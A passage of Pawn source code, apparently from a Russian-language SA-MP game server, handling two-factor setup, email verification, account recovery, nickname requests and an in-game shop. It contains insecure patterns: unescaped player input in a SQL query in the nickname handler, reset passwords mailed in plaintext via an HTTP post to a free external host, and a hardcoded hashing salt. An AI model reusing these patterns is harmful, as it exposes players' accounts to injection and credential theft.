					ShowPlayerDialogEx(playerid, 2327, DIALOG_STYLE_INPUT, "Ввод параметра", string, "Выбрать", "Назад");
	            }
	        }
	    }
	case 2326:
	    {
	        if(!response)
	        {
	       		ShowPlayerDialogEx(playerid, 2324,DIALOG_STYLE_LIST, "Меню", "[0] Сгенерировать ключ\n[1] Отключить", "Выбор", "Назад");
	        	return true;
	        }
	        else
	        {
	            if(!strlen(inputtext)) return ShowPlayerDialogEx(playerid, 2326, DIALOG_STYLE_PASSWORD, "Ввод параметра", "Введите гугл-код", "Выбрать", "Назад");
	            new mustGoogleKey = GoogleAuthenticatorCode(PlayerInfo[playerid][pGoogleKey], gettime());
	            if(strval(inputtext) != mustGoogleKey)
	            {
	            	return ShowPlayerDialogEx(playerid, 2326, DIALOG_STYLE_PASSWORD, "Ввод параметра", "Введите гугл-код", "Выбрать", "Назад");
	            }
	            else
	            {
	                SCM(playerid, COLOR_GREEN, " Изменения приняты");
	                mysql_format(DATABASE,QUERY,128, "UPDATE accounts SET pGoogleIP = '0' WHERE name = '%s'", PlayerInfo[playerid][pName]);
					mysql_function_query(DATABASE,QUERY,false,"","");
					PlayerInfo[playerid][pGoogleIP] = 0;
	            }
	        }
	    }
	case 2327:
		{
	        if(!response) return ShowPlayerDialogEx(playerid, 2325, DIALOG_STYLE_PASSWORD, "Ввод параметра", "Введите свой основной пароль", "Выбрать", "Назад");
	        else
	        {
	            new GoogleKey[17];
	            GetPVarString(playerid, "GoogleKey", GoogleKey, sizeof(GoogleKey));
	            DeletePVar(playerid, "GoogleKey");
				new mustGoogleKey = GoogleAuthenticatorCode(GoogleKey, gettime());
	            if(strval(inputtext) != mustGoogleKey)
	            {
	                SCM(playerid, COLOR_LIGHTRED, " Вы ввели не верный код");
	                new secretkey[17];
	                for(new i = 0; i < 17; i ++) strcat(secretkey, googleauth[random(sizeof(googleauth))]);
	                SetPVarString(playerid, "GoogleKey", secretkey);
					format(string, sizeof(string), "Ваш секретный ключ: %s\nВведите его в программе Google Authenticator\n\nВведите гугл-код для сохранения настроек", secretkey);
					ShowPlayerDialogEx(playerid, 2327, DIALOG_STYLE_INPUT, "Ввод параметра", string, "Выбрать", "Назад");
	            }
	            else
	            {
	                SCM(playerid, COLOR_GREEN, " Изменения приняты");
					mysql_format(DATABASE,QUERY,128, "UPDATE accounts SET pGoogleIP = '1', pGoogleKey = '%s' WHERE name = '%s'", GoogleKey, PlayerInfo[playerid][pName]);
					mysql_function_query(DATABASE,QUERY,false,"","");
					PlayerInfo[playerid][pGoogleIP] = 1;
	            }
	        }
		}
	case 35:
		{
			if(!response) return ShowPlayerDialogEx(playerid, 2323, DIALOG_STYLE_LIST, "Безопасность", "[1] Вкл / Откл проверку по IP\n[2] Сменить ключ\n[3] Помощь\n[4] Эмаил\n[5] Google Authenticator", "Выбрать", "Назад");
			switch(listitem)
			{
			    case 0:
			    {
			        if(PlayerInfo[playerid][pActivemail] && !GetPVarInt(playerid, "mail_access"))
			        {
			            SCM(playerid, -1, " Ожидание...");
                        new randpass = 10000 + random(99999);
                        SetPVarInt(playerid, "mail_key", randpass);
			            format(string, sizeof(string), "to=%s&subject=Код подтверждения Е-мэйл&text=Код подтверждения Е-мэйл: %i<br><br> ---<br> С уважением,<br> %s<br> http://%s<br><br> Не отвечайте на это письмо если вы считаете, что данное письмо пришло к вам по ошибке.", PlayerInfo[playerid][pEmail], randpass, NameServer, NameSite);
			            HTTP(playerid, HTTP_POST, "olexandr-shch.000webhostapp.com/sendmail.php", string, "MyHttpResponses");
			            if(PlayerInfo[playerid][pActivemail] && !GetPVarInt(playerid, "mail_access"))
					    {
							format(string, sizeof(string), "[0] Разблокировать. Получить код\n[1] Разблокировать. Ввести код\n[2] {000000}Указать новый эмаил\n[3] {000000}Подтвердить. Получить код\n[4] {000000}Подтвердить. Ввести код");
						}
						else
						{
						    format(string, sizeof(string), "[0] {000000}Разблокировать. Получить код\n[1] {000000}Разблокировать. Ввести код\n[2] Указать новый эмаил\n[3] Подтвердить. Получить код\n[4] Подтвердить. Ввести код");
						}
						ShowPlayerDialogEx(playerid,35,DIALOG_STYLE_LIST, "Эмаил", string, "Выбрать", "Назад");
			        }
			        else
			        {
						SCM(playerid, COLOR_GREY, " Вы уже сняли блокировку");
						if(PlayerInfo[playerid][pActivemail] && !GetPVarInt(playerid, "mail_access"))
					    {
							format(string, sizeof(string), "[0] Разблокировать. Получить код\n[1] Разблокировать. Ввести код\n[2] {000000}Указать новый эмаил\n[3] {000000}Подтвердить. Получить код\n[4] {000000}Подтвердить. Ввести код");
						}
						else
						{
						    format(string, sizeof(string), "[0] {000000}Разблокировать. Получить код\n[1] {000000}Разблокировать. Ввести код\n[2] Указать новый эмаил\n[3] Подтвердить. Получить код\n[4] Подтвердить. Ввести код");
						}
						ShowPlayerDialogEx(playerid,35,DIALOG_STYLE_LIST, "Эмаил", string, "Выбрать", "Назад");
						return true;
					}
			    }
			    case 1:
			    {
			    	if(PlayerInfo[playerid][pActivemail] && !GetPVarInt(playerid, "mail_access"))
			    	{
			            ShowPlayerDialogEx(playerid, 36, DIALOG_STYLE_INPUT, "Эмаил", "Введите код, который был отправлен на вашу почту в строке ниже", "Далее", "Назад");
			        }
			        else
			        {
						SCM(playerid, COLOR_GREY, " Вы уже сняли блокировку");
						if(PlayerInfo[playerid][pActivemail] && !GetPVarInt(playerid, "mail_access"))
					    {
							format(string, sizeof(string), "[0] Разблокировать. Получить код\n[1] Разблокировать. Ввести код\n[2] {000000}Указать новый эмаил\n[3] {000000}Подтвердить. Получить код\n[4] {000000}Подтвердить. Ввести код");
						}
						else
						{
						    format(string, sizeof(string), "[0] {000000}Разблокировать. Получить код\n[1] {000000}Разблокировать. Ввести код\n[2] Указать новый эмаил\n[3] Подтвердить. Получить код\n[4] Подтвердить. Ввести код");
						}
						ShowPlayerDialogEx(playerid,35,DIALOG_STYLE_LIST, "Эмаил", string, "Выбрать", "Назад");
						return true;
					}
			    }
				case 2:
				{
					if(PlayerInfo[playerid][pActivemail] && !GetPVarInt(playerid, "mail_access"))
					{
						SCM(playerid, COLOR_GREY, " Необходимо разблокировать");
						if(PlayerInfo[playerid][pActivemail] && !GetPVarInt(playerid, "mail_access"))
					    {
							format(string, sizeof(string), "[0] Разблокировать. Получить код\n[1] Разблокировать. Ввести код\n[2] {000000}Указать новый эмаил\n[3] {000000}Подтвердить. Получить код\n[4] {000000}Подтвердить. Ввести код");
						}
						else
						{
						    format(string, sizeof(string), "[0] {000000}Разблокировать. Получить код\n[1] {000000}Разблокировать. Ввести код\n[2] Указать новый эмаил\n[3] Подтвердить. Получить код\n[4] Подтвердить. Ввести код");
						}
						ShowPlayerDialogEx(playerid,35,DIALOG_STYLE_LIST, "Эмаил", string, "Выбрать", "Назад");
						return true;
					}
					ShowPlayerDialogEx(playerid, 37, DIALOG_STYLE_INPUT, "Эмаил", "Введите новый эмаил адрес вашего аккаунта", "Далее", "Назад");
				}
				case 3:
				{
					if(PlayerInfo[playerid][pActivemail] && !GetPVarInt(playerid, "mail_access"))
					{
						SCM(playerid, COLOR_GREY, " Вы уже активировали Эмаил");
						if(PlayerInfo[playerid][pActivemail] && !GetPVarInt(playerid, "mail_access"))
					    {
							format(string, sizeof(string), "[0] Разблокировать. Получить код\n[1] Разблокировать. Ввести код\n[2] {000000}Указать новый эмаил\n[3] {000000}Подтвердить. Получить код\n[4] {000000}Подтвердить. Ввести код");
						}
						else
						{
						    format(string, sizeof(string), "[0] {000000}Разблокировать. Получить код\n[1] {000000}Разблокировать. Ввести код\n[2] Указать новый эмаил\n[3] Подтвердить. Получить код\n[4] Подтвердить. Ввести код");
						}
						ShowPlayerDialogEx(playerid,35,DIALOG_STYLE_LIST, "Эмаил", string, "Выбрать", "Назад");
						return true;
					}
                    SCM(playerid, -1, " Ожидание...");
                    new randpass = 10000 + random(99999);
                    SetPVarInt(playerid, "mail_key", randpass);
		            format(string, sizeof(string), "to=%s&subject=Код подтверждения Е-мэйл&text=Код подтверждения Е-мэйл: %i<br><br> ---<br> С уважением,<br> %s<br> http://%s<br><br> Не отвечайте на это письмо если вы считаете, что данное письмо пришло к вам по ошибке.", PlayerInfo[playerid][pEmail], randpass, NameServer, NameSite);
		            HTTP(playerid, HTTP_POST, "olexandr-shch.000webhostapp.com/sendmail.php", string, "MyHttpResponses");
		            if(PlayerInfo[playerid][pActivemail] && !GetPVarInt(playerid, "mail_access"))
				    {
						format(string, sizeof(string), "[0] Разблокировать. Получить код\n[1] Разблокировать. Ввести код\n[2] {000000}Указать новый эмаил\n[3] {000000}Подтвердить. Получить код\n[4] {000000}Подтвердить. Ввести код");
					}
					else
					{
					    format(string, sizeof(string), "[0] {000000}Разблокировать. Получить код\n[1] {000000}Разблокировать. Ввести код\n[2] Указать новый эмаил\n[3] Подтвердить. Получить код\n[4] Подтвердить. Ввести код");
					}
					ShowPlayerDialogEx(playerid,35,DIALOG_STYLE_LIST, "Эмаил", string, "Выбрать", "Назад");
				}
				case 4:
				{
					if(PlayerInfo[playerid][pActivemail] && !GetPVarInt(playerid, "mail_access"))
					{
						SCM(playerid, COLOR_GREY, " Вы уже активировали Эмаил");
						if(PlayerInfo[playerid][pActivemail] && !GetPVarInt(playerid, "mail_access"))
					    {
							format(string, sizeof(string), "[0] Разблокировать. Получить код\n[1] Разблокировать. Ввести код\n[2] {000000}Указать новый эмаил\n[3] {000000}Подтвердить. Получить код\n[4] {000000}Подтвердить. Ввести код");
						}
						else
						{
						    format(string, sizeof(string), "[0] {000000}Разблокировать. Получить код\n[1] {000000}Разблокировать. Ввести код\n[2] Указать новый эмаил\n[3] Подтвердить. Получить код\n[4] Подтвердить. Ввести код");
						}
						ShowPlayerDialogEx(playerid,35,DIALOG_STYLE_LIST, "Эмаил", string, "Выбрать", "Назад");
						return true;
					}
					ShowPlayerDialogEx(playerid, 38, DIALOG_STYLE_INPUT, "Эмаил", "Введите код подтверждения, который был отправлен на вашу почту", "Далее", "Назад");
				}
			}
		}
	case 36:
	    {
	        if(!response) 
	        {
	            if(PlayerInfo[playerid][pActivemail] && !GetPVarInt(playerid, "mail_access"))
			    {
					format(string, sizeof(string), "[0] Разблокировать. Получить код\n[1] Разблокировать. Ввести код\n[2] {000000}Указать новый эмэил\n[3] {000000}Подтвердить. Получить код\n[4] {000000}Подтвердить. Ввести код");
				}
				else
				{
				    format(string, sizeof(string), "[0] {000000}Разблокировать. Получить код\n[1] {000000}Разблокировать. Ввести код\n[2] Указать новый эмаил\n[3] Подтвердить. Получить код\n[4] Подтвердить. Ввести код");
				}
				ShowPlayerDialogEx(playerid,35,DIALOG_STYLE_LIST, "Эмаил", string, "Выбрать", "Назад");
	        }
	        if(!strval(inputtext)) return ShowPlayerDialogEx(playerid, 36, DIALOG_STYLE_INPUT, "Эмаил", "Введите код, который был отправлен на вашу почту в строке ниже", "Далее", "Назад");
	        if(strval(inputtext) != GetPVarInt(playerid, "mail_key"))
	        {
	            SCM(playerid, COLOR_GREY, " Вы ввели неверный код подтверждения!");
	            if(PlayerInfo[playerid][pActivemail] && !GetPVarInt(playerid, "mail_access"))
			    {
					format(string, sizeof(string), "[0] Разблокировать. Получить код\n[1] Разблокировать. Ввести код\n[2] {000000}Указать новый эмаил\n[3] {000000}Подтвердить. Получить код\n[4] {000000}Подтвердить. Ввести код");
				}
				else
				{
				    format(string, sizeof(string), "[0] {000000}Разблокировать. Получить код\n[1] {000000}Разблокировать. Ввести код\n[2] Указать новый эмаил\n[3] Подтвердить. Получить код\n[4] Подтвердить. Ввести код");
				}
				ShowPlayerDialogEx(playerid,35,DIALOG_STYLE_LIST, "Эмаил", string, "Выбрать", "Назад");
	            return true;
	        }
	        else
	        {
	            SetPVarInt(playerid, "mail_access", 1);
				PlayerInfo[playerid][pActivemail] = 0;
				DeletePVar(playerid, "mail_key");
	            SCM(playerid, -1, " Ожидание...");
	            SCM(playerid, COLOR_YELLOW, " Блокировка снята. Теперь вы можете сменить Эмэил адрес");
	            if(PlayerInfo[playerid][pActivemail] && !GetPVarInt(playerid, "mail_access"))
			    {
					format(string, sizeof(string), "[0] Разблокировать. Получить код\n[1] Разблокировать. Ввести код\n[2] {000000}Указать новый эмаил\n[3] {000000}Подтвердить. Получить код\n[4] {000000}Подтвердить. Ввести код");
				}
				else
				{
				    format(string, sizeof(string), "[0] {000000}Разблокировать. Получить код\n[1] {000000}Разблокировать. Ввести код\n[2] Указать новый эмаил\n[3] Подтвердить. Получить код\n[4] Подтвердить. Ввести код");
				}
				ShowPlayerDialogEx(playerid,35,DIALOG_STYLE_LIST, "Эмаил", string, "Выбрать", "Назад");
	        }
	    }
	case 37:
	    {
	        if(!response) 
	        {
	            if(PlayerInfo[playerid][pActivemail] && !GetPVarInt(playerid, "mail_access"))
			    {
					format(string, sizeof(string), "[0] Разблокировать. Получить код\n[1] Разблокировать. Ввести код\n[2] {000000}Указать новый эмэил\n[3] {000000}Подтвердить. Получить код\n[4] {000000}Подтвердить. Ввести код");
				}
				else
				{
				    format(string, sizeof(string), "[0] {000000}Разблокировать. Получить код\n[1] {000000}Разблокировать. Ввести код\n[2] Указать новый эмаил\n[3] Подтвердить. Получить код\n[4] Подтвердить. Ввести код");
				}
				ShowPlayerDialogEx(playerid,35,DIALOG_STYLE_LIST, "Эмаил", string, "Выбрать", "Назад");
	        }
	        if(!strlen(inputtext)) return ShowPlayerDialogEx(playerid, 37, DIALOG_STYLE_INPUT, "Эмаил", "Введите новый эмаил адрес вашего аккаунта", "Далее", "Назад");
			strmid(PlayerInfo[playerid][pEmail], inputtext, 0, strlen(inputtext), 128);
			SendMes(playerid, -1, " Вы успешно сменили Эмэил адрес на %s", PlayerInfo[playerid][pEmail]);
			if(PlayerInfo[playerid][pActivemail] && !GetPVarInt(playerid, "mail_access"))
		    {
				format(string, sizeof(string), "[0] Разблокировать. Получить код\n[1] Разблокировать. Ввести код\n[2] {000000}Указать новый эмаил\n[3] {000000}Подтвердить. Получить код\n[4] {000000}Подтвердить. Ввести код");
			}
			else
			{
			    format(string, sizeof(string), "[0] {000000}Разблокировать. Получить код\n[1] {000000}Разблокировать. Ввести код\n[2] Указать новый эмаил\n[3] Подтвердить. Получить код\n[4] Подтвердить. Ввести код");
			}
			ShowPlayerDialogEx(playerid,35,DIALOG_STYLE_LIST, "Эмаил", string, "Выбрать", "Назад");
	    }
	case 38:
	    {
	        if(!response)
	        {
	            if(PlayerInfo[playerid][pActivemail] && !GetPVarInt(playerid, "mail_access"))
			    {
					format(string, sizeof(string), "[0] Разблокировать. Получить код\n[1] Разблокировать. Ввести код\n[2] {000000}Указать новый эмэил\n[3] {000000}Подтвердить. Получить код\n[4] {000000}Подтвердить. Ввести код");
				}
				else
				{
				    format(string, sizeof(string), "[0] {000000}Разблокировать. Получить код\n[1] {000000}Разблокировать. Ввести код\n[2] Указать новый эмаил\n[3] Подтвердить. Получить код\n[4] Подтвердить. Ввести код");
				}
				ShowPlayerDialogEx(playerid,35,DIALOG_STYLE_LIST, "Эмаил", string, "Выбрать", "Назад");
	        }
	        if(!strval(inputtext)) return ShowPlayerDialogEx(playerid, 36, DIALOG_STYLE_INPUT, "Эмаил", "Введите код, который был отправлен на вашу почту в строке ниже", "Далее", "Назад");
	        if(strval(inputtext) != GetPVarInt(playerid, "mail_key"))
	        {
	            SCM(playerid, COLOR_GREY, " Вы ввели неверный код подтверждения!");
	            if(PlayerInfo[playerid][pActivemail] && !GetPVarInt(playerid, "mail_access"))
			    {
					format(string, sizeof(string), "[0] Разблокировать. Получить код\n[1] Разблокировать. Ввести код\n[2] {000000}Указать новый эмаил\n[3] {000000}Подтвердить. Получить код\n[4] {000000}Подтвердить. Ввести код");
				}
				else
				{
				    format(string, sizeof(string), "[0] {000000}Разблокировать. Получить код\n[1] {000000}Разблокировать. Ввести код\n[2] Указать новый эмаил\n[3] Подтвердить. Получить код\n[4] Подтвердить. Ввести код");
				}
				ShowPlayerDialogEx(playerid,35,DIALOG_STYLE_LIST, "Эмаил", string, "Выбрать", "Назад");
	            return true;
	        }
	        else
	        {
	            SetPVarInt(playerid, "mail_access", 0);
	            SCM(playerid, -1, " Ожидание...");
	            SCM(playerid, COLOR_YELLOW, " Вы успешно подтвердили свой Эмаил адрес");
	            PlayerInfo[playerid][pActivemail] = 1;
	            DeletePVar(playerid, "mail_key");
	            if(PlayerInfo[playerid][pActivemail] && !GetPVarInt(playerid, "mail_access"))
			    {
					format(string, sizeof(string), "[0] Разблокировать. Получить код\n[1] Разблокировать. Ввести код\n[2] {000000}Указать новый эмаил\n[3] {000000}Подтвердить. Получить код\n[4] {000000}Подтвердить. Ввести код");
				}
				else
				{
				    format(string, sizeof(string), "[0] {000000}Разблокировать. Получить код\n[1] {000000}Разблокировать. Ввести код\n[2] Указать новый эмаил\n[3] Подтвердить. Получить код\n[4] Подтвердить. Ввести код");
				}
				ShowPlayerDialogEx(playerid,35,DIALOG_STYLE_LIST, "Эмаил", string, "Выбрать", "Назад");
	        }
		}
	case 40:
	    {
	        if(!response) return SCM(playerid, COLOR_LIGHTRED, " Для выхода из игры введите (/q)uit" ), Kick(playerid);
			switch(listitem)
			{
			    case 0:
			    {
			        ShowPlayerDialogEx(playerid, 5131, DIALOG_STYLE_INPUT, "Восстановление доступа", "Введите эмеил адрес аккаунта", "Готово", "Назад");
			    }
			    case 1:
			    {
			        ShowPlayerDialogEx(playerid, 5132, DIALOG_STYLE_INPUT, "Восстановление доступа", "Введите код подтверждения для сброса паролей", "Готово", "Назад");
			    }
			}
	    }
	case 5131:
	    {
	        if(!response) return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/restoreaccess");
			mysql_format(DATABASE, QUERY, sizeof(QUERY), "SELECT `pEmail` FROM `"TABLE_ACCOUNTS"` WHERE `Name` = '%s'", PlayerInfo[playerid][pName]);
			mysql_query(DATABASE, QUERY);
			new r = cache_num_rows();
			if(r)
			{
				cache_get_field_content(0,"pEmail",PlayerInfo[playerid][pEmail],DATABASE,60);
			}
			else return SCM(playerid, COLOR_GREY, " Ваш Эмеил не был найден..."), Kick(playerid);
	        if(!strcmp(inputtext, PlayerInfo[playerid][pEmail], false))
	        {
	            SCM(playerid, -1, " Ожидание...");
		        new randpass = 10000 + random(99999);
	            SetPVarInt(playerid, "mail_key", randpass);
	            format(string, sizeof(string), "to=%s&subject=Код подтверждения Е-мэйл&text=Код подтверждения Е-мэйл: %i<br><br> ---<br> С уважением,<br> %s<br> http://%s<br><br> Не отвечайте на это письмо если вы считаете, что данное письмо пришло к вам по ошибке.", PlayerInfo[playerid][pEmail], randpass, NameServer, NameSite);
	            HTTP(playerid, HTTP_POST, "olexandr-shch.000webhostapp.com/sendmail.php", string, "MyHttpResponses");
	            CallLocalFunction("OnPlayerCommandText", "is", playerid, "/restoreaccess");
          	}
          	else
 			{
          	    SCM(playerid, COLOR_GREY, " Эмеил адрес не совпадает");
          	    ShowPlayerDialogEx(playerid, 5131, DIALOG_STYLE_INPUT, "Восстановление доступа", "Введите эмеил адрес аккаунта", "Готово", "Назад");
          	}
	    }
    case 5132:
	    {
	        if(!response) return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/restoreaccess");
	        if(GetPVarInt(playerid, "mail_key") != strval(inputtext))
	        {
	            SCM(playerid, COLOR_GREY, " Код подтверждения введён не правильно");
	            ShowPlayerDialogEx(playerid, 5132, DIALOG_STYLE_INPUT, "Восстановление доступа", "Введите код подтверждения для сброса паролей", "Готово", "Назад");
	        }
	        else
	        {
	            SCM(playerid, -1, " Ожидание...");
		        new randpass1[128], randpass2[128];
				format(randpass1, 128, "%i", (100000 + random(899999999)));
				format(randpass2, 128, "%i", (100000 + random(899999999)));
				new Hash1[64 + 1], Hash2[64 + 1];
				SHA256_PassHash(randpass1, "78sdjs", Hash1, sizeof Hash1);
				SHA256_PassHash(randpass2, "78sdjs", Hash2, sizeof Hash2);
				mysql_format(DATABASE, QUERY, sizeof(QUERY), "UPDATE `"TABLE_ACCOUNTS"` SET `pKey` = '%s', `pKeyip` = '%s' WHERE `Name` = '%s'", Hash1, Hash2, PlayerInfo[playerid][pName]);
				mysql_query(DATABASE, QUERY);
	            format(string, sizeof(string), "to=%s&subject=Восстановление доступа&text=Здравствуйте!<br><br>Ваши пароли на сервере %s были сброшены: <br>Ваш новый пароль от аккаунта: <b>%s</b><br>Ваш новый защитный ключ: <b>%s</b><br><br>С уважением, администрация!", NameServer, PlayerInfo[playerid][pEmail], randpass1, randpass2);
	            HTTP(playerid, HTTP_POST, "olexandr-shch.000webhostapp.com/sendmail.php", string, "MyHttpResponse2");
	            SetTimerEx("Kicking" , 3000, false, "i", playerid);
	        }
	    }
	case 9943:
		{
			if(!response) return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/mm");
			if(!strlen(inputtext)) return ShowPlayerDialogEx(playerid,9943,DIALOG_STYLE_INPUT, "Заявка на смену ника", "Напишите новый ник (по форме Имя_Фамилия)", "Отправить", "Назад");
			new sendername[MAX_PLAYER_NAME];
			//if(IsIP(inputtext) || CheckString(inputtext) || strcmp(inputtext, "_",true) == -1) return SCM(playerid,COLOR_GREY,"NonRP ник.");
            mysql_format(DATABASE, QUERY, 256, "SELECT `Name` FROM `"TABLE_ACCOUNTS"` WHERE `Name` = '%s'", inputtext);
			mysql_query(DATABASE, QUERY);
			new r = cache_num_rows();
			if(r)
			{
			    SCM(playerid, COLOR_GREY, " Данный ник используется");
			}
			else
			{
				format(WantNickChange[playerid],MAX_PLAYER_NAME, "%s",inputtext);
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, 190, " [Заявка на смену ника] %s[%i] просит сменить ник на: %s", sendername,playerid,(inputtext));
				ABroadCast(COLOR_LIGHTGREEN, string, 1);
				format(string, 190, " [Заявка на смену ника] %s[%i] просит сменить ник на: %s", sendername,playerid,(inputtext));
				SCM(playerid, COLOR_LIGHTGREEN, string);
				SCM(playerid, -1, " Ваша заявка отправлена. Ждите одобрения администрацией");
				return true;
			}
		}
	case 9623:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0:
				{
					format(string,256,"[1] Чат оос\t\t%s\n[2] Чат семьи\t\t%s\n[3] Ники игроков\t%s",(!GetPVarInt(playerid,"ooc_chat"))?("выключить") : ("включить"),
					(!GetPVarInt(playerid,"family_chat"))?("выключить") : ("включить"), (!GetPVarInt(playerid,"name_tag"))?("выключить") : ("включить"));
					ShowPlayerDialogEx(playerid, 9973, DIALOG_STYLE_LIST, "Настройки чата",string, "Выбрать", "Назад");
				}
			case 1: ShowStats(playerid,playerid);
			case 2: ShowPlayerDialogEx(playerid, 10025, DIALOG_STYLE_LIST, "Команды сервера","[0] Описание команд\n[1] Обычные\n[2] Чат\n[3] Телефон\n[4] Банк\n[5] Дом\n[6] Бизнес\n[7] Рыбалка\n[8] Работа\n[9] Лидеры\n[10] Репортеры\n[11] Мэрия\n[12] Инструкторы\n[13] Законники\n[14] Мафии/Банды\n[15] Автомобиль", "Выбрать", "Назад");
			case 3: ShowPlayerDialogEx(playerid, 229, DIALOG_STYLE_INPUT, "Задать вопрос по игре", "|               Напишите свой вопрос               |", "Отправить", "Назад");
			case 4: ShowPlayerDialogEx(playerid,10,DIALOG_STYLE_INPUT, "Отправить жалобу", "Вы собираетесь отправить администрации сообщение с жалобой\nОтправляйте по форме [ID/ник нарушитиля] [Текст жалобы]", "Отправить", "Назад");
			case 5: ShowPlayerDialogEx(playerid,11,DIALOG_STYLE_INPUT, "Смена пароля", "    Введите Ваш новый пароль     ", "Принять", "Отмена");
			case 6:
				{
					new clearc;
					while(clearc++ < 99)
					SCM(playerid, -1, " ");
				}
			case 7:
				{
					new rulesdialog[1300];
					format(rulesdialog,sizeof(rulesdialog), "%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
					RulesMSG[0],RulesMSG[1],RulesMSG[2],RulesMSG[3],RulesMSG[4],RulesMSG[5],RulesMSG[6],RulesMSG[7],RulesMSG[8],RulesMSG[9],RulesMSG[10],RulesMSG[11],RulesMSG[12],RulesMSG[13],RulesMSG[14],RulesMSG[15],RulesMSG[16]);
					ShowPlayerDialogEx(playerid,9980,DIALOG_STYLE_MSGBOX, "Правила сервера", rulesdialog, "Согласен", "Выйти");
					return true;
				}
			case 8: ShowPlayerDialogEx(playerid,8842,DIALOG_STYLE_INPUT, "Слив денег", "Если к Вам попали ворованные/читерские деньги\nотправьте их администрации сервера.\nИначе Вы будете забанены как соучастник", "Слив", "Назад");
			case 9:
				{
					ShowPlayerDialogEx(playerid, 2323, DIALOG_STYLE_LIST, "Безопасность", "[1] Вкл / Откл. проверку по IP\n[2] Сменить ключ\n[3] Помощь\n[4] Эмаил\n[5] Google Authenticator", "Выбрать", "Назад");
					return true;
				}
			case 10: ShowPlayerDialogEx(playerid,9943,DIALOG_STYLE_INPUT, "Заявка на смену ника", "Напишите новый ник (по форме Имя_Фамилия)", "Отправить", "Назад");
			case 11:
				{
                     format(string, 2500, "{FFFFFF}Наименование\tСтоимость\n\
					 {FFFFFF}[0] Пользователь\t\t{AE443D}%s{FFFFFF}\n\
					 {FFFFFF}[1] {F3FF02}GOLD {FFFFFF}COINS\t\t{AE443D}%i/%i{FFFFFF}\n\
					 {FFFFFF}[2] Конвентировать в игровую валюту\t{F3FF02}200+ {FFFFFF}COINS\n\
					 {FFFFFF}[3] Снять предупреждение\t{F3FF02}400 {FFFFFF}COINS\n\
					 {FFFFFF}[4] Приобрести VIP BRONZE [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}1000 {FFFFFF}COINS\n\
					 {FFFFFF}[5] Приобрести {00FFEE}VIP{FFFFFF} SILVER [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}2000 {FFFFFF}COINS\n\
					 {FFFFFF}[6] Приобрести {F3FF02}VIP{FFFFFF} GOLD [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}3000 {FFFFFF}COINS\n\
					 {FFFFFF}[7] Вылечиться от наркозависимости\t{F3FF02}300 {FFFFFF}COINS\n\
					 {FFFFFF}[8] Приобрести ''Наркозависимость''\t{F3FF02}400 {FFFFFF}COINS\n\
					 {FFFFFF}[9] Приобрести ''Комплект лицензий''\t{F3FF02}200 {FFFFFF}COINS\n\
					 {FFFFFF}[10] Приобрести ''Навык стрельбы''\t{F3FF02}300 {FFFFFF}COINS\n\
					 {FFFFFF}[11] Приобрести ''Законопослушность''\t{F3FF02}600 {FFFFFF}COINS\n\
					 {FFFFFF}[12] Приобрести ''Навык дальнобойщика''\t{F3FF02}2000 {FFFFFF}COINS\n\
					 {FFFFFF}[13] Приобрести ''Навык таксиста''\t{F3FF02}500 {FFFFFF}COINS",
					 PlayerInfo[playerid][pName],
					 PlayerInfo[playerid][pDonateMoney],
					 PlayerInfo[playerid][pDonateAccount]);
					 ShowPlayerDialogEx(playerid,29322,DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Донат [ {AE443D}/viphelp{FFFFFF} ] | {AE443D}EVOLVE", string, "Выбрать", "Отмена");
				}
			case 12:
				{
					if(booston == 0) return SCM(playerid,-1," Бонусы отключены");
					mysql_format(DATABASE,QUERY,256,"SELECT * FROM `boost` WHERE `Text` = 'BoostTime'");
					return mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",36,playerid,"");
				}
			}
		}
	case 20086:
		{
			if(!response) return ShowPlayerDialogEx(playerid, 8900, DIALOG_STYLE_LIST, "ATM","[0] Пополнить счет\n[1] Снять со счета\n[2] Баланс\n[3] Оплатить квартплату", "Выбрать", "Назад");
			if(PlayerInfo[playerid][pLevel] < 5 || PlayerInfo[playerid][pBank] < 100000) return ShowPlayerDialogEx(playerid,8905,DIALOG_STYLE_MSGBOX, "Банкомат","К сожалению вы не можете подать объявление\nПричину прочтите в INFO", "Назад", "");
			new null = -1;
			for(new i = 0; i < 20; i++) if(!strlen(ATMADVERTISE[i])) { null = i; break; }
			if(null == -1) return ShowPlayerDialogEx(playerid,8905,DIALOG_STYLE_MSGBOX, "Банкомат","Нет места для опубликования объявления\nЖдите следующего часа!", "Назад", "");
			return ShowPlayerDialogEx(playerid,20087,DIALOG_STYLE_INPUT,"Банкомат","Введите текст объявления","Опубликовать","Назад");
		}
	case 20087:
		{
			if(!response) return ShowPlayerDialogEx(playerid, 8900, DIALOG_STYLE_LIST, "ATM","[0] Пополнить счет\n[1] Снять со счета\n[2] Баланс\n[3] Оплатить квартплату", "Выбрать", "Назад");
			if(strlen(inputtext) > 60) return SCM(playerid,COLOR_GREY," Макс. 60 символов"), ShowPlayerDialogEx(playerid, 8900, DIALOG_STYLE_LIST, "ATM","[0] Пополнить счет\n[1] Снять со счета\n[2] Баланс\n[3] Оплатить квартплату", "Выбрать", "Назад");
			if(PlayerInfo[playerid][pBank] < strlen(inputtext)*100) return SCM(playerid,COLOR_GREY," Недостаточно средств на банковском счету"), ShowPlayerDialogEx(playerid, 8900, DIALOG_STYLE_LIST, "ATM","[0] Пополнить счет\n[1] Снять со счета\n[2] Баланс\n[3] Оплатить квартплату", "Выбрать", "Назад");
			new null = -1;
			for(new i = 0; i < 20; i++) if(!strlen(ATMADVERTISE[i])) { null = i; break; }
			if(null == -1) return ShowPlayerDialogEx(playerid,8905,DIALOG_STYLE_MSGBOX, "Банкомат","Нет места для опубликования объявления\nЖдите следующего часа!", "Назад", "");
			format(string,180,"%s | %s | Тел: %i", PlayerInfo[playerid][pName], inputtext, PlayerInfo[playerid][pPnumber]);
			strmid(ATMADVERTISE[null],string, 0, strlen(string),150);
			format(string,10,"~r~-$%i",strlen(inputtext)*100), GameTextForPlayer(playerid,string,1000,1);
			PlayerInfo[playerid][pBank]-=strlen(inputtext)*100;
			FracBank[0][fKazna] += strlen(inputtext)*100;
